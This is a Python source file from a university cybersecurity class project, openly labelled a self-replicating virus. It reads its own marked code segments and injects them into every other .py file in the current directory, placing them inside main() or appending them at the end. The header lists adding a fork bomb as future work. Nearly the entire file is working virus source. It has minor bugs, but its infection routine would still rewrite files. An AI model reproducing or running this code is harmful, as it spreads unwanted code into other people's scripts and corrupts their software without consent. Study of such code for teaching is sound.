'''
--------------------------------------------------------------------------------
Class:          ECE 4305 Cybersecurity
Group Number:   2
Group Members:  Jess Leal
                Jaemin Kim
                Huaishu Huang
                Lino Mercado-Esquivias

Description:    Self Replicating Virus
                A virus that infects other python scripts. It takes malicious
                code and injects it at the beginning of the main function of 
                other python scripts.

Future Work:    1) Add malicious function (i.e. fork bomb)
--------------------------------------------------------------------------------
'''

def main():
    # prepare payload
    virus_payload = prepare_payload()
    # search for and infect potential hosts
    spread_infection(virus_payload)
    # malicious function

def prepare_payload():
    # MALICIOUS SEGMENT BEGIN
    import sys
    virus_directory = sys.argv[0]
    with open(virus_directory, "r") as virus_file:
        unpacked_virus_file = virus_file.readlines()
    malicious_segment = False
    virus_payload = []
    for line in unpacked_virus_file:
        if line.strip() == "# MALICIOUS SEGMENT BEGIN":
            malicious_segment = True
        if malicious_segment:
            virus_payload.append(line)
        if line.strip() == "# MALICIOUS SEGMENT END":
            malicious_segment = False
    # MALICIOUS SEGMENT END
    return virus_payload

def spread_infection(virus_payload):
    # MALICIOUS SEGMENT BEGIN
    import re
    from glob import glob
    import colors as colors 

    main_function_pattern =  r"""
    ^\s*                        # Leading whitespace
    def\s+                      # Define keyword with trailing space
    main\s*                     # Main function with optional trailing space
    \(                          # Opening parenthesis
    \s*([^)]*)\s*               # Zero or more arguments inside the parentheses
    \)\s*                       # Closing parenthesis with a colon
    (->\s*[^:]+)?\s*:           # Optional return type with trailing colon
    """
    # Example Patterns:
    # def main():
    # def main(a, b, c):
    # def main(a: int, b: float) -> int:
    regex = re.compile(main_function_pattern, re.VERBOSE)

    # search for potential hosts
    current_directory_files = glob("*.py")
    for file in current_directory_files:
        with open(file, "r") as f:
            file_code = f.readlines()

        # check if vector is infected
        file_is_infected = False
        main_function_line_number = -1
        for line_number,line in enumerate(file_code, start=1):
            if line.strip() == "# MALICIOUS SEGMENT BEGIN":
                file_is_infected = True
                break
            elif (match := regex.match(line)):
                main_function_line_number = line_number

        # inject payload inside main if main() exists
        if not file_is_infected and main_function_line_number != -1:       
            infected_code = []
            modified_payload = ["    " + line for line in virus_payload]
            infected_code = file_code
            infected_code[main_function_line_number:main_function_line_number] = virus_payload
            with open(file, "w") as f:
                print(f"File {file} has been infected.")
                f.writelines(infected_code)
        # inject payload at the bottom if main() doesn't exist
        elif not file_is_infected and main_function_line_number == -1:     
            infected_code = file_code + virus_payload
            with open(file, "w") as f:
                print(f"File {file} has beeninfected.")
                f.writelines(infected_code)
        else:
            print(f"File {file} has already been infected.")
    # MALICIOUS SEGMENT END

if __name__ == "__main__":
    main()